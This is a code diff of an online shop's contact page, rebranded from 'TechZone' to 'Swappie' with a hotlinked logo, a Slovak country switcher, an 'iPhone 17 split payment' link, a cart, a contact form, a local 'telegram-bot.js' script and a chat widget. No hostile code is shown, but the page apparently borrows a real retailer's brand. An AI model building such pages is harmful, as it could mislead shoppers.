@@ -3,104 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contact Us - TechZone</title>
+    <title>Contact Us - Swappie</title>
     <link rel="stylesheet" href="style.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <style>
-        .contact-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 2rem;
-        }
-        .contact-hero {
-            text-align: center;
-            margin-bottom: 3rem;
-        }
-        .contact-hero h1 {
-            font-size: 2.5rem;
-            color: var(--secondary-color);
-            margin-bottom: 1rem;
-        }
-        .contact-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 3rem;
-            margin-bottom: 3rem;
-        }
-        .contact-form {
-            background: white;
-            padding: 2rem;
-            border-radius: var(--border-radius);
-            border: 1px solid var(--border-color);
-            box-shadow: var(--shadow);
-        }
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-        .form-group label {
-            display: block;
-            margin-bottom: 0.5rem;
-            font-weight: 600;
-            color: var(--secondary-color);
-        }
-        .form-group input,
-        .form-group textarea {
-            width: 100%;
-            padding: 0.75rem;
-            border: 2px solid var(--border-color);
-            border-radius: var(--border-radius);
-            font-size: 1rem;
-            transition: var(--transition);
-        }
-        .form-group input:focus,
-        .form-group textarea:focus {
-            outline: none;
-            border-color: var(--primary-color);
-        }
-        .contact-info {
-            background: var(--background-light);
-            padding: 2rem;
-            border-radius: var(--border-radius);
-        }
-        .country-office {
-            background: white;
-            padding: 1.5rem;
-            border-radius: var(--border-radius);
-            margin-bottom: 1.5rem;
-            border: 1px solid var(--border-color);
-        }
-        .country-header {
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            margin-bottom: 1rem;
-        }
-        .country-flag {
-            font-size: 1.5rem;
-        }
-        .country-name {
-            font-size: 1.25rem;
-            font-weight: 700;
-            color: var(--secondary-color);
-        }
-        .office-details p {
-            margin-bottom: 0.5rem;
-            color: var(--text-light);
-        }
-        .office-details i {
-            width: 20px;
-            color: var(--primary-color);
-        }
-        @media (max-width: 768px) {
-            .contact-grid {
-                grid-template-columns: 1fr;
-                gap: 2rem;
-            }
-            .contact-hero h1 {
-                font-size: 2rem;
-            }
-        }
-    </style>
 </head>
 <body>
     <!-- Header -->
@@ -108,167 +13,127 @@
         <div class="container">
             <div class="header-content">
                 <div class="logo">
-                    <a href="index.html">
-                        <img src="https://1000logos.net/wp-content/uploads/2023/11/Swappie-Logo.png" alt="TechZone" style="height: 40px; width: auto;">
+                    <a href="/index.html">
+                        <img src="https://1000logos.net/wp-content/uploads/2023/11/Swappie-Logo.png" alt="Swappie" style="height: 40px; width: auto;">
                     </a>
                 </div>
                 <nav class="nav-desktop">
-                    <a href="index.html" class="nav-link">Home</a>
-                    <a href="index.html#products" class="nav-link">Products</a>
-                    <a href="about.html" class="nav-link">About</a>
-                    <a href="contact.html" class="nav-link active">Contact</a>
+                    <a href="/index.html" class="nav-link" data-translate="home">Home</a>
+                    <a href="/index.html#products" class="nav-link" data-translate="products">Products</a>
+                    <a href="/iphone17-split-payment.html" class="nav-link" data-translate="split_payment">Split Payment</a>
+                    <a href="/about.html" class="nav-link" data-translate="about">About</a>
+                    <a href="/contact.html" class="nav-link" data-translate="contact">Contact</a>
                 </nav>
                 <div class="header-actions">
-                    <div class="search-box">
-                        <input type="text" data-translate-placeholder="search_products" placeholder="Search products...">
-                        <i class="fas fa-search"></i>
+                    <div class="country-dropdown-wrapper" style="margin-right: 1rem;">
+                        <button id="country-dropdown-btn" class="country-switch">
+                            <span class="flag-icon" id="current-flag">🇸🇰</span>
+                            <span id="current-country">Slovensko</span>
+                            <i class="fas fa-chevron-down"></i>
+                        </button>
+                        <div id="country-dropdown" class="country-dropdown hidden"></div>
                     </div>
-                    <a href="#" class="user-link">
-                        <i class="fas fa-user"></i>
-                    </a>
                     <a href="#" id="cart-button" class="cart-link">
                         <i class="fas fa-shopping-cart"></i>
                         <span id="cart-count" class="cart-count">0</span>
                     </a>
-                    <a href="index.html" class="btn btn-primary" data-translate="shop_now">Shop Now</a>
                 </div>
             </div>
         </div>
     </header>
 
-    <main class="contact-container">
-        <div class="contact-hero">
-            <h1>Contact Us</h1>
-            <p>Get in touch with our team for support, questions, or partnerships</p>
+    <!-- Main Content -->
+    <main class="container" style="padding-top: 3rem; padding-bottom: 3rem;">
+        <div class="section-header" style="text-align: center; margin-bottom: 3rem;">
+            <h1 data-translate="contact_us_title">Contact Us</h1>
+            <p data-translate="contact_us_subtitle" style="font-size: 1.1rem; color: var(--text-light);">We're here to help. Reach out to us with any questions or concerns.</p>
         </div>
 
-        <div class="contact-grid">
-            <div class="contact-form">
-                <h2 data-translate="send_message">Send us a Message</h2>
-                <form>
-                    <div class="form-group">
-                        <label for="name" data-translate="full_name">Full Name</label>
-                        <input type="text" id="name" name="name" required>
+        <div class="contact-page-content">
+            <!-- Dynamic Contact Info Section -->
+            <div class="contact-info-section">
+                <h2 data-translate="our_office">Our Office</h2>
+                <div id="contact-details-container">
+                    <!-- Content will be populated by script.js -->
+                    <div class="contact-card-placeholder">
+                        <div class="placeholder-line" style="width: 40%;"></div>
+                        <div class="placeholder-line" style="width: 80%;"></div>
+                        <div class="placeholder-line" style="width: 60%;"></div>
+                        <div class="placeholder-line" style="width: 70%;"></div>
                     </div>
-                    <div class="form-group">
-                        <label for="email" data-translate="email_address">Email Address</label>
-                        <input type="email" id="email" name="email" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="phone" data-translate="phone_number">Phone Number</label>
-                        <input type="tel" id="phone" name="phone">
-                    </div>
-                    <div class="form-group">
-                        <label for="subject" data-translate="subject">Subject</label>
-                        <input type="text" id="subject" name="subject" required>
-                    </div>
-                    <div class="form-group">
-                        <label for="message" data-translate="message">Message</label>
-                        <textarea id="message" name="message" rows="5" required></textarea>
-                    </div>
-                    <button type="submit" class="btn btn-primary" data-translate="send_message_btn">Send Message</button>
-                </form>
+                </div>
             </div>
 
-            <div class="contact-info">
-                <h2>Our Offices</h2>
-
-                <div class="country-office">
-                    <div class="country-header">
-                        <span class="country-flag">🇺🇸</span>
-                        <span class="country-name">USA Headquarters</span>
+            <!-- Contact Form Section -->
+            <div class="contact-form-section">
+                <h2 data-translate="send_us_message">Send Us a Message</h2>
+                <form id="contact-form">
+                    <div class="form-group">
+                        <label for="contact-name" data-translate="full_name">Full Name</label>
+                        <input type="text" id="contact-name" required>
                     </div>
-                    <div class="office-details">
-                        <p><i class="fas fa-map-marker-alt"></i> 1234 Tech Boulevard, Suite 500, Austin, TX 78701</p>
-                        <p><i class="fas fa-phone"></i> +1 415-762-3849</p>
-                        <p><i class="fas fa-envelope"></i> sales@techzone-usa.com</p>
-                        <p><i class="fas fa-clock"></i> Mon-Sat: 9:00 AM - 8:00 PM CST</p>
+                    <div class="form-group">
+                        <label for="contact-email" data-translate="email_address">Email Address</label>
+                        <input type="email" id="contact-email" required>
                     </div>
-                </div>
-
-                <div class="country-office">
-                    <div class="country-header">
-                        <span class="country-flag">🇳🇮</span>
-                        <span class="country-name">Nicaragua</span>
+                    <div class="form-group">
+                        <label for="contact-subject" data-translate="subject">Subject</label>
+                        <input type="text" id="contact-subject" required>
                     </div>
-                    <div class="office-details">
-                        <p><i class="fas fa-map-marker-alt"></i> Centro Comercial Plaza Real, Local 45, Managua</p>
-                        <p><i class="fas fa-phone"></i> +505 8888-8888</p>
-                        <p><i class="fas fa-envelope"></i> ventas@techzone-ni.com</p>
-                        <p><i class="fas fa-clock"></i> Lun-Sáb: 9:00 AM - 8:00 PM</p>
+                    <div class="form-group">
+                        <label for="contact-message" data-translate="message">Message</label>
+                        <textarea id="contact-message" rows="5" required></textarea>
                     </div>
-                </div>
-
-                <div class="country-office">
-                    <div class="country-header">
-                        <span class="country-flag">🇭🇳</span>
-                        <span class="country-name">Honduras</span>
-                    </div>
-                    <div class="office-details">
-                        <p><i class="fas fa-map-marker-alt"></i> Colonia Palmira, Edificio Torre Empresarial, Piso 3, Tegucigalpa M.D.C.</p>
-                        <p><i class="fas fa-phone"></i> +504 2216-8888</p>
-                        <p><i class="fas fa-envelope"></i> contacto@techzone.hn</p>
-                        <p><i class="fas fa-clock"></i> Lun-Sáb: 9:00 AM - 8:00 PM</p>
-                    </div>
-                </div>
-
-                <div class="country-office">
-                    <div class="country-header">
-                        <span class="country-flag">🇹🇹</span>
-                        <span class="country-name">Trinidad & Tobago</span>
-                    </div>
-                    <div class="office-details">
-                        <p><i class="fas fa-map-marker-alt"></i> 15 Pembroke Street, Port of Spain, Trinidad</p>
-                        <p><i class="fas fa-phone"></i> +1 (868) 299-7324</p>
-                        <p><i class="fas fa-envelope"></i> support@techzone.tt</p>
-                        <p><i class="fas fa-clock"></i> Mon-Sat: 9:00 AM - 6:00 PM</p>
-                    </div>
-                </div>
-
-                <div class="country-office">
-                    <div class="country-header">
-                        <span class="country-flag">🇰🇳</span>
-                        <span class="country-name">St. Kitts & Nevis</span>
-                    </div>
-                    <div class="office-details">
-                        <p><i class="fas fa-map-marker-alt"></i> Bay Road, Basseterre, St. Kitts</p>
-                        <p><i class="fas fa-phone"></i> +1 (869) 765-4321</p>
-                        <p><i class="fas fa-envelope"></i> hello@techzone-skn.com</p>
-                        <p><i class="fas fa-clock"></i> Mon-Fri: 9:00 AM - 5:00 PM</p>
-                    </div>
-                </div>
+                    <button type="submit" class="btn btn-primary" data-translate="send_message">Send Message</button>
+                </form>
             </div>
         </div>
     </main>
 
+    <!-- Footer -->
     <footer class="footer">
         <div class="container">
-            <div class="footer-content">
-                <div class="footer-section">
-                    <h4>Company Information</h4>
-                    <p><i class="fas fa-map-marker-alt"></i> TechZone USA, 123 Main Street, Anytown, USA</p>
-                    <p id="footer-phone">
-                        <i class="fas fa-phone"></i>
-                        <span id="footer-country-phone">+1 (800) 555-TECH</span>
-                    </p>
-                    <p><i class="fas fa-envelope"></i> sales@techzone-usa.com</p>
-                </div>
-                <div class="footer-section">
-                    <h4>Quick Links</h4>
-                    <ul>
-                        <li><a href="about.html">About Us</a></li>
-                        <li><a href="contact.html">Contact</a></li>
-                        <li><a href="support.html">Technical Support</a></li>
-                        <li><a href="warranty.html">Warranty</a></li>
-                    </ul>
-                </div>
-            </div>
             <div class="footer-bottom">
-                <p>&copy; 2024 TechZone USA. All rights reserved.</p>
+                <p>&copy; 2024 Swappie. <span data-translate="rights_reserved">All rights reserved.</span></p>
             </div>
         </div>
     </footer>
 
+    <!-- Cart Sidebar -->
+    <div id="cart-overlay" class="cart-overlay">
+        <div id="cart-sidebar" class="cart-sidebar">
+            <div class="cart-header">
+                <h2 data-translate="shopping_cart">Shopping Cart</h2>
+                <button id="close-cart" aria-label="Close cart"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="cart-items" id="cart-items"></div>
+            <div class="cart-summary">
+                <div class="summary-row total">
+                    <span data-translate="total">Total:</span>
+                    <span id="cart-total">$0.00</span>
+                </div>
+            </div>
+            <div class="cart-actions">
+                <button id="checkout-btn" class="btn btn-primary" data-translate="checkout">Proceed to Checkout</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script src="telegram-bot.js"></script>
     <script src="script.js"></script>
+    <!--Start of Tawk.to Script-->
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/68ccde8d05c2ee19277b977c/default';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+    })();
+    </script>
+    <!--End of Tawk.to Script-->
 </body>
 </html>
